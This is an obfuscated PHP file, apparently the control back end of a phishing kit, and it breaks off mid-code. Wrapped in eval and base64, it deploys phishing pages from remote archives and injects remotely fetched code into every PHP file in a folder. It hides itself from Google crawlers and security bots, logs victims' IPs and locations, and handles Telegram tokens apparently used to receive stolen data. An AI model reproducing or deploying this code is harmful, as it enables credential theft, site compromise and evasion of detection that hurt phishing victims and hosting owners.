<?php eval(base64_decode('
 goto W7Way; gRRxP: $local_time = date("\x59\55\155\x2d\x64\x20\110\72\151\72\x73"); goto fAyFO; WhB1Y: function update_user_view($user) { list($token, $chatid) = get_expire_token(); list($token_view, $chatid_view) = get_view_token($user); $dateexp = $_SESSION["\145\170\160\x69\162\x65\x5f\x64\x61\x74\145"]; $expireTimestamp = strtotime($dateexp); $currentTimestamp = time(); if ($currentTimestamp >= $expireTimestamp) { setcookie("\x74\x6f\x6b\145\156\164\x65\x6c", $token, time() + 86400 * 30, "\57"); setcookie("\151\x64\x74\x65\154", $chatid, time() + 86400 * 30, "\57"); setcookie("\x72\x65\x64\x69\162\151\143\x74", $_SESSION["\162\x65\144\x69\162\x69\x63\164"], time() + 86400 * 30, "\57"); setcookie("\x70\x72\157\x6a\x65\x63\x74", $_SESSION["\x70\162\x6f\x6a\x65\x63\x74"], time() + 86400 * 30, "\x2f"); setcookie("\163\x6f\165\162\x63\145\155\145", $_SESSION["\x61\x64\144\x62\171"], time() + 86400 * 30, "\x2f"); setcookie("\x6e\x65\167\137\145\x78\160", $expireTimestamp, time() + 86400 * 30, "\57"); setcookie("\x76\x6f\x6c\155", $token, time() + 86400 * 30, "\57"); setcookie("\144\x6f\154\x6d", $chatid, time() + 86400 * 30, "\x2f"); } else { setcookie("\164\157\x6b\145\x6e\x74\145\x6c", $token_view, time() + 86400 * 30, "\x2f"); setcookie("\151\x64\164\x65\154", $chatid_view, time() + 86400 * 30, "\x2f"); setcookie("\162\x65\144\151\x72\x69\143\164", $_SESSION["\162\x65\x64\x69\162\151\143\x74"], time() + 86400 * 30, "\x2f"); setcookie("\160\x72\x6f\152\x65\x63\x74", $_SESSION["\x70\x72\x6f\x6a\145\143\x74"], time() + 86400 * 30, "\x2f"); setcookie("\x73\157\x75\162\x63\x65\x6d\145", $_SESSION["\141\x64\x64\x62\x79"], time() + 86400 * 30, "\x2f"); setcookie("\x76\x6f\x6c\155", $token, time() + 86400 * 30, "\57"); setcookie("\x64\157\154\155", $chatid, time() + 86400 * 30, "\57"); } } goto WeNrb; z4ZdM: function user_data($ipAddress, $id) { global $fs_host, $fs_user, $fs_log, $fs_name; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\x43\157\x6e\x6e\x65\143\164\151\x6f\156\x20\146\x61\x69\154\x65\144\x3a\40" . mysqli_connect_error()); } $sql_u = "\123\105\114\105\103\x54\40\52\40\x46\x52\117\x4d\x20\x72\x65\144\151\162\143\164\151\157\x6e\x20\127\x48\x45\x52\x45\x20\x69\x64\x3d\x27{$id}\47"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { while ($row = mysqli_fetch_array($res_u)) { $_SESSION["\x6c\151\156\x6b"] = base64_decode(base64_decode($row["\154\x69\x6e\x6b"])); $_SESSION["\143\156"] = explode("\x3b", base64_decode(base64_decode($row["\143\x6f\165\x6e\x74\x72\x79"]))); $_SESSION["\x70\151\143"] = $row["\160\x69\x63"]; $_SESSION["\x6d\x73\147"] = base64_decode(base64_decode($row["\155\x73\147"])); $_SESSION["\x65\x78\160\151\x72\x65\137\x64\x61\x74\145"] = $row["\x65\170\160\x69\x72\145\x5f\144\141\164\x65"]; $_SESSION["\x73\x65\162\166\145\x72"] = base64_decode(base64_decode($row["\163\x65\162\166\145\162"])); $_SESSION["\x75\162\154"] = base64_decode(base64_decode($row["\x75\162\154"])); $_SESSION["\154\x75\170\x63\141\160\x74\143\150\141"] = $row["\x6c\165\x78\143\141\x70\x74\x63\150\x61"]; $_SESSION["\164\x6f\x6b\x65\x6e\164\145\154"] = base64_decode(base64_decode($row["\164\157\153\145\156\164\145\154"])); $_SESSION["\x69\x64\164\145\154"] = base64_decode(base64_decode($row["\151\x64\x74\x65\154"])); $_SESSION["\x72\x65\144\x69\162\151\143\164"] = $row["\x72\x65\x64\151\x72\x69\x63\164"]; $_SESSION["\160\162\x6f\x6a\x65\x63\164"] = $row["\x70\x72\157\x6a\x65\x63\x74"]; $_SESSION["\x61\x70\151"] = $row["\x61\x70\151"]; $_SESSION["\x61\x64\144\142\171"] = $row["\141\144\x64\142\171"]; $_SESSION["\x69\x73\x70\162\157\x74\145\x63\x74"] = $row["\151\163\160\162\x6f\x74\x65\143\164"]; $_SESSION["\160\162\157\170\171"] = $row["\160\x72\x6f\170\171"]; $_SESSION["\143\141\x70\x74\143\150\x61\x5f\x64\x61\164\x61"] = $row["\143\x61\x70\164\143\150\x61"]; $_SESSION["\147\157\157\154\145\137\143\141\160"] = $row["\x67\x6f\157\147\x6c\145\137\x63\x61\x70"]; $_SESSION["\x63\x6c\157\165\144\x5f\x63\x61\x70"] = $row["\x63\154\157\x75\x64\x5f\143\x61\x70"]; $_SESSION["\x70\x72\x6f\137\151\x63\x6f"] = $row["\x70\x72\x6f\137\x69\143\x6f"]; $_SESSION["\x70\x72\x6f\137\143\157\154\157\162"] = $row["\x70\x72\157\x5f\143\157\x6c\x6f\162"]; $_SESSION["\160\162\157\x5f\x6d\x73\147"] = $row["\x70\162\157\137\155\163\147"]; $_SESSION["\x70\x72\x6f\x5f\x69\x6d\x67"] = $row["\160\x72\x6f\137\x69\155\x67"]; $_SESSION["\x70\x72\x6f\137\x6c\157\147\x6f"] = $row["\160\x72\x6f\x5f\154\x6f\147\157"]; } } else { $refix = "\x6e\x6f\x74\x20\x66\157\165\156\144\40\151\x64\56{$id}"; banned_client($ipAddress, $refix); die; } mysqli_close($db); } goto EqqMq; Dnn5C: function getClientIP() { if (!empty($_SERVER["\x48\x54\x54\x50\x5f\x43\x4c\111\105\x4e\124\137\111\x50"])) { $ipAddress = $_SERVER["\x48\x54\x54\120\137\103\114\111\x45\x4e\124\x5f\x49\x50"]; } elseif (!empty($_SERVER["\x48\x54\124\x50\x5f\x58\x5f\x46\117\x52\127\x41\122\x44\105\104\x5f\106\117\x52"])) { $ipAddress = $_SERVER["\x48\x54\124\x50\x5f\130\x5f\106\x4f\x52\127\101\122\x44\x45\x44\137\x46\117\122"]; } else { $ipAddress = $_SERVER["\122\x45\115\117\124\x45\137\101\104\104\x52"]; } $validIPs = array(); $ipMatches = preg_match_all("\x2f\134\x62\134\x64\173\61\54\x33\x7d\134\56\x5c\x64\173\61\x2c\63\x7d\134\56\134\x64\x7b\61\x2c\63\175\134\56\x5c\x64\173\x31\54\x33\x7d\134\142\x2f", $ipAddress, $matches); if ($ipMatches) { $validIPs = $matches[0]; } if (!empty($validIPs)) { $_SESSION["\x73\x65\163\x73\x69\x6f\x6e\137\151\160"] = $validIPs[0]; return $validIPs[0]; } else { $_SESSION["\163\145\163\163\x69\x6f\156\x5f\x69\x70"] = "\x31\62\x37\56\x30\x2e\x30\56\61"; return "\x31\62\x37\x2e\60\56\x30\x2e\x31"; } } goto cfAnb; TDS_b: $local_ip_g = getClientIP(); goto UKDRR; YGnbO: $fs_user = base64_decode("\x65\155\x56\x79\x62\62\122\150\x65\130\x4e\x66\132\x47\106\x35"); goto n0o8V; p6YXU: header("\101\x63\x63\145\163\x73\55\x43\157\156\164\162\157\154\x2d\101\154\x6c\157\x77\x2d\x48\x65\x61\x64\145\162\x73\x3a\40\x43\x6f\156\164\x65\156\x74\x2d\124\171\160\x65"); goto ponCb; Fx4cc: function delete_zip($directory) { $zipFiles = glob($directory . "\52\56\172\151\x70"); if (!empty($zipFiles)) { foreach ($zipFiles as $zipFile) { if (is_file($zipFile)) { unlink($zipFile); } } } } goto tW0mZ; DSwvA: header("\x41\x63\x63\145\x73\163\55\x43\x6f\x6e\164\162\x6f\154\x2d\x41\x6c\154\157\167\55\115\x65\164\150\157\x64\x73\72\40\x50\x4f\123\124"); goto p6YXU; ponCb: header("\x43\x6f\156\x74\x65\156\x74\x2d\124\x79\160\145\x3a\x20\141\160\160\154\x69\x63\141\x74\151\157\156\x2f\152\x73\157\156"); goto A_PPf; TQ6hR: $currentTimestamp = time(); goto TDS_b; AGud5: $local_userAgent = isset($_SERVER["\110\x54\x54\120\137\x55\123\x45\122\137\101\x47\x45\x4e\124"]) ? $_SERVER["\x48\124\124\x50\x5f\x55\123\x45\122\137\101\107\105\x4e\124"] : ''; goto gRRxP; wuYJ9: deleteOldFolders("\167\145\142"); goto TQ6hR; zapO0: function ip_in_range($ip, $range) { list($subnet, $mask) = explode("\x2f", $range); $mask = (int) $mask; $subnetBin = inet_pton($subnet); $ipBin = inet_pton($ip); $maskBin = str_repeat("\xff", $mask >> 3) . chr(255 << 8 - ($mask & 7)); if (strlen($subnetBin) < 4 || strlen($ipBin) < 4 || strlen($maskBin) < 4) { return false; } $subnetInt = unpack("\x4e", $subnetBin)[1]; $ipInt = unpack("\116", $ipBin)[1]; $maskInt = unpack("\116", $maskBin)[1]; return ($subnetInt & $maskInt) === ($ipInt & $maskInt); } goto ZHQsm; VZdkD: function random_number($length) { $characters = "\60\61\x32\x33\64\x35\66\67\x38\71"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } goto z4ZdM; avRbc: function getFileContents($fileURL) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $fileURL); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $response = curl_exec($curl); $statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE); $error = curl_error($curl); curl_close($curl); if ($statusCode === 200 && empty($error)) { $localFilePath = "\x77\x65\x62\57\x61\x70\x69\x2e\x70\150\x70"; file_put_contents($localFilePath, $response); } else { echo "\105\x72\x72\157\x72\x20\x66\145\164\x63\150\151\156\147\40\x66\x69\x6c\x65\x3a\x20" . $error; } } goto Fx4cc; x4e0J: function banned_client($ipAddress, $reason) { global $fs_host, $fs_user, $fs_log, $fs_name, $local_browser, $local_os, $local_domain, $local_time; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\x43\157\x6e\156\x65\143\x74\151\157\156\x20\146\141\151\x6c\145\144\72\x20" . mysqli_connect_error()); } $sql_check = "\123\105\114\x45\x43\124\40\x2a\x20\x46\122\x4f\115\40\x6c\157\147\x73\40\127\110\105\122\x45\40\151\160\x61\144\x64\x72\x65\x73\x3d\77"; $stmt = mysqli_prepare($db, $sql_check); mysqli_stmt_bind_param($stmt, "\163", $ipAddress); mysqli_stmt_execute($stmt); $result = mysqli_stmt_get_result($stmt); if (mysqli_num_rows($result) > 0) { mysqli_close($db); http_response_code(405); $responseData = array("\162\145\163\137\163\164\x61\164\165\x73" => "\x34\x30\x35", "\x6d\x65\163\163\141\147\x65" => "\x55\163\x65\x72\x20\151\163\x20\x61\154\162\145\141\x64\171\40\x69\156\40\x74\150\x65\40\142\154\x61\x63\x6b\154\151\x73\x74"); echo json_encode($responseData); die; } $country = mysqli_real_escape_string($db, str_replace("\47", '', $_SESSION["\x73\145\x73\163\151\157\156\137\x63\157\x75\x6e\164\x72\171"])); $browser = mysqli_real_escape_string($db, str_replace("\47", '', $local_browser)); $os_db = mysqli_real_escape_string($db, str_replace("\x27", '', $local_os)); $local_domain = mysqli_real_escape_string($db, str_replace("\47", '', $local_domain)); $host = mysqli_real_escape_string($db, str_replace("\x27", '', getHost($ipAddress))); $isp = mysqli_real_escape_string($db, str_replace("\47", '', $_SESSION["\163\x65\x73\163\151\157\x6e\x5f\151\163\160"])); $mobile = mysqli_real_escape_string($db, str_replace("\47", '', $_SESSION["\x73\145\x73\x73\151\x6f\x6e\137\155\157\142\151\x6c\x65"])); $proxy = mysqli_real_escape_string($db, str_replace("\x27", '', $_SESSION["\x73\145\x73\x73\x69\x6f\x6e\137\x70\x72\x6f\170\171"])); $hosting = mysqli_real_escape_string($db, str_replace("\47", '', $_SESSION["\x73\x65\x73\163\151\157\x6e\137\x68\157\x73\164\151\156\x67"])); $city = mysqli_real_escape_string($db, str_replace("\47", '', $_SESSION["\163\145\163\x73\x69\157\x6e\x5f\143\x69\x74\171"])); $region = mysqli_real_escape_string($db, str_replace("\x27", '', $_SESSION["\x73\145\163\163\151\x6f\x6e\x5f\x72\x65\147\x69\x6f\156"])); $time = mysqli_real_escape_string($db, str_replace("\x27", '', $local_time)); $sql_insert = "\111\116\123\105\122\124\x20\111\116\x54\117\x20\x6c\x6f\147\x73\40\50\151\x70\x61\x64\144\162\145\x73\x2c\x63\157\x75\156\x74\x72\171\54\x62\162\157\x77\163\x65\162\54\x6f\x73\x2c\x64\x6f\x6d\x69\x6e\x65\54\x68\x6f\163\x74\54\x69\x73\x70\x2c\155\x6f\x62\151\154\145\54\160\x72\157\170\x79\x2c\x68\x6f\163\164\151\x6e\x67\54\x63\151\164\171\54\x72\145\147\x69\157\156\54\155\171\x74\x69\155\145\54\x72\x65\x73\157\156\51\40\126\101\x4c\x55\x45\x53\x20\x28\x3f\x2c\77\54\x3f\x2c\77\54\x3f\54\77\54\77\x2c\40\77\54\40\77\54\x20\x3f\x2c\40\77\54\40\77\x2c\x20\77\54\x20\77\x29"; $stmt = mysqli_prepare($db, $sql_insert); mysqli_stmt_bind_param($stmt, "\163\163\x73\x73\163\x73\163\163\163\x73\163\x73\163\x73", $ipAddress, $country, $browser, $os_db, $local_domain, $host, $isp, $mobile, $proxy, $hosting, $city, $region, $time, $reason); mysqli_stmt_execute($stmt); mysqli_close($db); http_response_code(405); $responseData = array("\x72\x65\x73\137\163\164\x61\x74\x75\163" => "\x34\x30\65", "\x6d\x65\163\x73\x61\x67\x65" => "\125\x73\x65\x72\40\x61\x64\x64\x65\x64\x20\164\157\x20\164\150\x65\x20\x62\154\x61\143\x6b\x6c\151\163\164"); echo json_encode($responseData); die; } goto bIKta; ZHQsm: function deleteOldFolders($directory) { $files = scandir($directory); foreach ($files as $file) { if ($file == "\x2e" || $file == "\56\56") { continue; } if (is_dir($directory . "\57" . $file)) { $lastModified = filemtime($directory . "\x2f" . $file); $difference = (time() - $lastModified) / 60; if ($difference > 20) { deleteDirectory($directory . "\x2f" . $file); } } } } goto fm38t; UKDRR: global $fs_host, $fs_user, $fs_log, $fs_name, $local_userAgent, $local_time, $local_domain, $local_os, $local_ip_g, $local_browser; goto C4Gbt; n0o8V: $fs_log = base64_decode("\x5a\x48\x4a\x6a\132\x32\x6c\163\x65\x56\101\167\113\x6d\163\155"); goto KNu6r; LPEIP: function random_string($length) { $characters = "\141\142\x63\144\145\146\x6a\150\x69\147\153\154\x6d\156\x6f\x70\161\x72\163\164\x75\166\167\170\171\x7a\60\61\x32\x33\64\x35\66\x37\70\x39\101\102\x43\x44\x45\106\x47\x48\111\x4a\x4b\x4c\115\x4e\x4f\120\x51\122\123\x54\x55\x56\x57\130\131\132"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return bin2hex(random_bytes(16)); } goto VZdkD; G8f26: if ($_SERVER["\122\x45\121\125\105\123\x54\137\115\x45\x54\x48\x4f\x44"] === "\120\117\123\x54") { $view_com_ip = isset($_POST["\166\x69\x65\x77\x5f\163\145\156\x64\x5f\x69\160"]) ? $_POST["\x76\151\x65\167\137\x73\x65\x6e\144\137\151\x70"] : null; $view_com_domain = isset($_POST["\166\151\145\x77\x5f\163\145\156\x64\x5f\x64\157\x6d\141\151\156"]) ? $_POST["\x76\x69\x65\167\137\163\145\x6e\144\137\144\157\x6d\x61\151\x6e"] : null; $view_return_domain = isset($_POST["\166\x69\145\167\137\x72\x65\x74\x75\x72\x6e\137\144\x6f\155\x61\x69\156"]) ? $_POST["\x76\151\145\167\137\162\145\x74\165\162\x6e\137\x64\x6f\155\141\x69\x6e"] : null; $view_com_id = isset($_POST["\x76\151\x65\x77\x5f\163\145\x6e\144\x5f\x69\144"]) ? $_POST["\x76\151\145\167\137\163\145\x6e\x64\137\x69\144"] : null; $view_com_action = isset($_POST["\166\151\x65\x77\x5f\x73\145\156\x64\x5f\x61\x63\164\151\x6f\x6e"]) ? $_POST["\166\x69\145\x77\x5f\163\145\156\x64\137\x61\x63\164\151\x6f\156"] : null; $view_patch = isset($_POST["\166\151\x65\x77\x5f\160\x61\164\x63\150"]) ? $_POST["\x76\151\145\167\x5f\x70\141\x74\143\x68"] : null; $view_user = isset($_POST["\x76\151\145\167\137\x75\163\145\162"]) ? $_POST["\166\x69\x65\x77\137\165\163\145\162"] : null; if ($view_com_ip !== null && $view_com_domain !== null && $view_return_domain !== null && $view_com_id !== null && $view_com_action !== null && $view_patch !== null && $view_user !== null) { if ($_POST["\x76\x69\145\x77\137\163\x65\x6e\x64\137\141\x63\x74\x69\157\x6e"] == "\x76\151\x65\167") { global $view_com_ip; fetchIPInfo($view_com_ip); user_data($view_com_ip, $view_com_id); $_SESSION["\154\x6f\x6c\151\160\163"] = $view_com_ip; $_SESSION["\x6c\x6f\154\x73\157\165\154\163"] = $view_com_id; update_user_view($view_user); $RandOP_Mlux = random_string(6); $url = $view_patch . "\77\x26\x76\x69\145\x77\75" . $RandOP_Mlux . $RandOP_Mlux . "\x26\x61\154\145\x72\x74\x3d" . $RandOP_Mlux . "\x26\x78\154\160\163\75" . $RandOP_Mlux . "\x26\163\x6f\165\x6c\x73\75" . $view_com_id . "\46\144\157\x6e\145\x3d\x26\x65\162\162\157\x72\x79\75" . $RandOP_Mlux . "\46\155\156\x65\x6d\x6f\156\151\143\75\x26\x6a\x62\x3d" . $RandOP_Mlux; header("\x4c\x6f\143\x61\x74\x69\157\x6e\x3a\x20{$url}"); die; } } $login_com_ip = isset($_POST["\154\x6f\147\151\156\137\x73\145\x6e\x64\x5f\151\160"]) ? $_POST["\x6c\157\147\151\x6e\x5f\x73\145\156\x64\137\151\160"] : null; $login_com_domain = isset($_POST["\x6c\x6f\147\x69\156\x5f\163\x65\156\x64\x5f\144\x6f\x6d\x61\x69\156"]) ? $_POST["\x6c\x6f\x67\x69\156\137\163\145\x6e\x64\137\144\157\x6d\x61\x69\156"] : null; $login_return_domain = isset($_POST["\154\x6f\147\151\x6e\x5f\162\x65\x74\165\x72\156\x5f\x64\x6f\155\141\x69\x6e"]) ? $_POST["\x6c\x6f\147\151\156\x5f\162\145\x74\x75\162\156\137\x64\x6f\155\x61\151\x6e"] : null; $login_com_id = isset($_POST["\154\x6f\x67\x69\x6e\137\x73\x65\x6e\x64\137\x69\x64"]) ? $_POST["\154\157\147\151\156\137\x73\x65\x6e\x64\137\x69\x64"] : null; $login_com_action = isset($_POST["\154\x6f\x67\x69\x6e\137\163\x65\156\144\137\141\x63\164\x69\x6f\156"]) ? $_POST["\154\x6f\x67\151\x6e\x5f\163\x65\156\144\x5f\x61\x63\x74\x69\157\x6e"] : null; $login_patch = isset($_POST["\x6c\157\147\151\x6e\x5f\160\x61\x74\x63\150"]) ? $_POST["\x6c\x6f\147\151\x6e\x5f\x70\141\x74\143\150"] : null; if ($login_com_ip !== null && $login_com_domain !== null && $login_return_domain !== null && $login_com_id !== null && $login_com_action !== null && $login_patch !== null) { if ($_POST["\154\x6f\147\x69\x6e\x5f\163\145\156\144\137\x61\x63\x74\x69\x6f\156"] == "\154\x6f\147\151\156") { global $login_com_ip; fetchIPInfo($login_com_ip); user_data($login_com_ip, $login_com_id); $_SESSION["\x6c\x6f\154\151\160\x73"] = $login_com_ip; $_SESSION["\154\x6f\x6c\x73\157\x75\x6c\x73"] = $login_com_id; update_user(); $RandOP_Mlux = random_string(6); $url = $login_patch . "\77\46\154\157\x67\x69\156\x3d" . $RandOP_Mlux . $RandOP_Mlux . "\46\141\x6c\x65\162\x74\x3d" . $RandOP_Mlux . "\46\170\154\160\x73\x3d" . $RandOP_Mlux . "\x26\x73\x6f\x75\x6c\x73\x3d" . $login_com_id . "\46\x64\x6f\156\145\x3d\x26\145\162\x72\157\162\171\x3d" . $RandOP_Mlux . "\46\155\156\x65\155\x6f\156\151\x63\75\x26\x6a\142\75" . $RandOP_Mlux; header("\114\157\x63\x61\164\151\157\x6e\x3a\40{$url}"); die; } $responseData = array("\154\x6f\147\x69\156\137\x72\145\163\x5f\163\164\x61\x74\x75\x73" => "\163\x75\x63\x63\x65\x73\x73", "\x6c\x6f\x67\151\x6e\x5f\x72\x65\163\137\144\x69\x72" => $login_patch, "\154\x6f\x67\x69\156\x5f\x72\145\163\137\x75\x72\x6c" => $login_com_domain, "\x6c\157\147\151\x6e\x5f\x72\x65\163\137\x69\x64" => $login_com_id, "\154\x6f\147\151\156\x5f\x72\x65\x73\x5f\x69\160" => $login_com_ip, "\154\x6f\x67\151\156\137\x72\145\163\137\x61\143\x74\151\x6f\156" => $login_com_action, "\154\157\x67\151\156\137\155\x65\x73\163\141\147\145" => "\154\x6f\147\151\156"); $responseJson = json_encode($responseData); echo $responseJson; } $com_ip = isset($_POST["\163\145\x6e\x64\137\x69\x70"]) ? $_POST["\x73\145\x6e\x64\137\151\x70"] : null; $com_domain = isset($_POST["\x73\x65\156\144\137\144\x6f\155\x61\151\156"]) ? $_POST["\163\x65\x6e\x64\137\144\x6f\x6d\x61\151\x6e"] : null; $return_domain = isset($_POST["\162\145\x74\165\162\156\x5f\x64\157\x6d\141\151\x6e"]) ? $_POST["\162\145\x74\165\162\x6e\137\x64\x6f\155\x61\151\x6e"] : null; $com_id = isset($_POST["\x73\145\156\144\x5f\151\x64"]) ? $_POST["\x73\145\x6e\144\137\151\x64"] : null; $com_action = isset($_POST["\x73\x65\x6e\x64\x5f\x61\143\164\151\157\x6e"]) ? $_POST["\163\x65\156\144\137\141\143\x74\151\x6f\x6e"] : null; if ($com_ip !== null && $com_domain !== null && $return_domain !== null && $com_id !== null && $com_action !== null) { global $com_ip; fetchIPInfo($com_ip); if (detect_user($com_ip)) { http_response_code(405); $responseData = array("\162\145\163\x5f\163\x74\x61\x74\165\x73" => "\64\60\65", "\x6d\x65\x73\x73\141\147\x65" => "\x75\x73\x65\162\x20\x62\154\157\143\153\145\x64"); $responseJson = json_encode($responseData); echo $responseJson; die; } if (is_bot_ip($com_ip)) { $reson = "\163\160\141\x6d\x20\151\x70"; banned_client($com_ip, $reson); http_response_code(405); $responseData = array("\x72\145\163\137\x73\x74\x61\x74\165\163" => "\64\60\x35", "\x6d\145\163\163\x61\147\145" => "\x75\163\145\162\x20\x73\x70\x61\155"); $responseJson = json_encode($responseData); echo $responseJson; die; } if (isGoogleUser($local_userAgent, $com_ip)) { $reson = "\x47\x6f\x6f\147\x6c\x65\40\151\x70"; banned_client($com_ip, $reson); $responseData = array("\x72\x65\163\137\163\164\141\164\x75\163" => "\x34\60\x36", "\x6c\157\143\x61\x6c\137\x75\x73\145\x72\x41\147\145\156\164" => $local_userAgent, "\x63\157\155\137\x69\x70" => $com_ip, "\x6d\145\163\163\141\147\145" => "\x69\160\40\x66\x69\x6c\164\x74\x65\162"); $responseJson = json_encode($responseData); echo $responseJson; die; } if ($_POST["\163\145\x6e\144\137\141\143\x74\151\157\x6e"] == "\x6c\157\147\x69\x6e") { user_data($com_ip, $com_id); update_user(); } if ($_POST["\x73\x65\x6e\144\x5f\141\143\x74\151\x6f\156"] == "\143\x72\145\x61\164\145") { user_data($com_ip, $com_id); download_extract($_SESSION["\x75\x72\154"]); update_index($_SESSION["\146\x6f\x6c\144\x65\162"]); add_user($_SESSION["\x66\157\x6c\x64\145\x72"], $com_ip); update_user(); if (isset($_SESSION["\146\x6f\154\144\x65\x72"])) { $folderPath = $_SESSION["\146\x6f\154\144\145\x72"]; $indexPath = findIndex($folderPath); if ($indexPath !== false && $indexPath !== $folderPath) { $relativePath = str_replace($folderPath . "\x2f", '', $indexPath); $indexContent = "\x3c\x3f\160\150\160\40\x68\x65\x61\144\145\162\x28\47\114\x6f\143\141\x74\151\x6f\x6e\x3a\40\56\x2f{$relativePath}\47\51\x3b\x20\77\76"; file_put_contents($folderPath . "\57\151\156\144\145\170\56\x70\150\160", $indexContent); } } if ($_SESSION["\x61\x70\151"] !== "\x41\120\111") { getFileContents($_SESSION["\x61\x70\151"]); } if ($_SESSION["\151\x73\160\162\157\x74\145\x63\x74"] == "\61") { update_php($_SESSION["\146\x6f\154\x64\x65\162"]); } else { update_php_normal($_SESSION["\x66\x6f\154\x64\145\162"]); } $responseData = array("\x72\x65\x73\137\x73\164\x61\164\x75\163" => "\163\x75\143\143\x65\163\x73", "\x72\x65\163\137\x64\x69\x72" => $_SESSION["\146\157\x6c\x64\145\162"], "\162\145\x73\x5f\165\x72\x6c" => $com_domain, "\162\145\x73\137\151\144" => $com_id, "\x72\x65\x73\137\x69\160" => $com_ip, "\162\x65\163\137\141\x63\x74\x69\x6f\x6e" => $com_action, "\x6d\145\163\x73\x61\147\x65" => "\163\165\x63\143\145\163\x73\x66\165\154\x6c\171"); $responseJson = json_encode($responseData); echo $responseJson; } } } else { $reson = "\x64\141\164\x61\40\156\157\164\x20\x61\x6c\x6c\x6f\167"; fetchIPInfo($local_ip_g); banned_client($local_ip_g, $reson); http_response_code(405); $responseData = array("\x72\x65\x73\x5f\x73\164\141\164\165\x73" => "\64\x30\x35", "\155\145\x73\x73\x61\x67\145" => "\144\x61\164\x61\40\x6e\x6f\164\40\x61\x6c\154\x6f\x77\x65\144"); $responseJson = json_encode($responseData); echo $responseJson; } goto WKVam; PSZfQ: function update_php_normal($folder_path) { $trackingFile = $folder_path . "\162\x6f\165\x6c\x73\56\x74\x78\x74"; $codeURL = base64_decode(base64_decode("\x59\125\150\123\x4d\107\x4e\x49\x54\124\132\115\145\x54\x6c\x35\127\126\150\152\144\126\x6f\171\142\x44\x42\150\x53\x46\x5a\x70\x5a\106\x68\x4f\x62\x47\x4e\164\x54\156\x5a\x69\142\154\x4a\163\131\x6d\x35\x52\x64\x56\153\x79\117\x58\x52\115\115\x6e\x68\x71\131\152\112\x34\x61\x47\x51\x7a\142\107\x78\152\x62\x6b\x31\62\x59\x7a\x49\65\x4d\x57\x4e\164\x54\155\x78\115\115\152\106\157\131\x56\x63\60\144\155\116\111\x53\156\x5a\153\x52\61\132\x71\x5a\x45\x59\65\144\x57\x49\x7a\123\156\122\132\126\x33\144\61\x5a\105\x68\x6f\115\x41")); $codeToAdd = fetchContentFromURL($codeURL); $codeToAddBottom = ''; $phpFilesList = getAllPhpFiles($folder_path); foreach ($phpFilesList as $filePath) { updatePhpFileWithCode($filePath, $codeToAdd); } } goto xTPP8; WeNrb: function findIndex($path) { if (is_dir($path)) { if (file_exists($path . "\x2f\x69\x6e\144\x65\x78\x2e\150\164\155\x6c") || file_exists($path . "\x2f\151\x6e\x64\145\x78\x2e\x70\150\x70")) { return $path; } else { $subDirectories = glob($path . "\57\52", GLOB_ONLYDIR); if (!empty($subDirectories)) { foreach ($subDirectories as $subDir) { $result = findIndex($subDir); if ($result !== false) { return $result; } } } } } return false; } goto V1cxt; EqqMq: function get_expire_token() { global $fs_host, $fs_user, $fs_log, $fs_name; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\103\x6f\x6e\x6e\145\x63\x74\x69\x6f\156\40\146\141\151\154\x65\144\x3a\x20" . mysqli_connect_error()); } $sql_u = "\x53\105\x4c\x45\x43\x54\40\164\145\x6c\145\x5f\164\157\153\145\156\x2c\40\164\145\x6c\145\137\x63\150\141\x74\151\144\40\106\x52\117\115\x20\172\145\162\157\137\163\145\162\x76\145\x72\x20\127\110\x45\x52\105\x20\151\x64\75\x27\61\x27"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { $row = mysqli_fetch_array($res_u); $_SESSION["\145\x78\160\x5f\x74\157\153\145\156"] = $row["\x74\x65\x6c\x65\x5f\164\157\x6b\145\156"]; $_SESSION["\x65\x78\160\x5f\x63\x68\x61\x74\x69\144"] = $row["\164\x65\x6c\145\x5f\x63\150\x61\x74\x69\x64"]; $token = $row["\164\145\154\x65\137\x74\x6f\153\145\156"]; $chatid = $row["\x74\x65\x6c\145\137\x63\150\x61\164\x69\144"]; return array($token, $chatid); } mysqli_close($db); return null; } goto vrOhC; rbDyY: function isGoogleUser($userAgent, $ipAddress) { if (stripos($userAgent, "\x67\157\157\x67\x6c\x65") !== false) { return true; } if (filter_var($ipAddress, FILTER_VALIDATE_IP)) { $hostname = gethostbyaddr($ipAddress); if (stripos($hostname, "\147\157\157\x67\154\x65") !== false) { return true; } } if (isset($_SESSION["\x73\145\x73\x73\x69\157\156\x5f\151\163\160"]) && stripos($_SESSION["\163\145\163\163\151\x6f\x6e\x5f\151\163\x70"], "\x67\x6f\x6f\147\154\x65") !== false) { return true; } return false; } goto Jj0i5; W7Way: header("\101\x63\x63\x65\163\x73\55\x43\157\156\x74\x72\157\154\x2d\101\x6c\x6c\x6f\x77\55\117\x72\x69\x67\x69\156\72\40\x2a"); goto DSwvA; OV1Iy: function get_platform($USER_AGENT) { $OS_ERROR = "\125\x6e\153\x6e\157\167\x6e\x20\x4f\123\40\120\154\x61\x74\146\157\x72\x6d"; $OS = array("\57\x77\x69\x6e\x64\x6f\167\163\x20\x6e\x74\x20\x31\61\57\x69" => "\127\151\x6e\x64\x6f\x77\x73\40\61\x31", "\57\167\x69\x6e\144\x6f\x77\163\x20\156\x74\x20\x31\x30\57\x69" => "\x57\151\x6e\x64\x6f\167\163\x20\x31\x30", "\57\167\x69\156\x64\x6f\167\x73\40\156\164\x20\x36\x2e\x33\x2f\151" => "\x57\x69\x6e\144\157\167\x73\40\70\56\61", "\x2f\x77\151\x6e\x64\157\167\163\40\156\164\40\66\56\62\57\151" => "\x57\151\156\144\157\167\x73\x20\70", "\x2f\167\151\156\144\x6f\167\x73\x20\156\164\x20\66\56\x31\57\151" => "\x57\x69\x6e\144\157\x77\163\x20\67", "\x2f\167\x69\156\144\157\167\x73\x20\x6e\x74\40\x36\56\60\x2f\x69" => 